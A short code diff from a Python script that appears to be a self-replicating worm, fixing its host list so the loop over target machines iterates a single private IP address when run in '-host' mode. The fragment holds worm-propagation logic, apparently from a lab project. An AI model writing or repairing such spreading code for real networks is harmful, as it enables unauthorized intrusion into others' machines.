@@ -129,7 +129,7 @@ if len(sys.argv) == 2:
 	if sys.argv[1] == "-host":
 		print("This is the host computer will change where worm is copied from")
 		wormLocation = "replicating_worm.py"
-		network = ("192.168.1.4")
+		network = ["192.168.1.4"]
 
 
 for Host in network:		
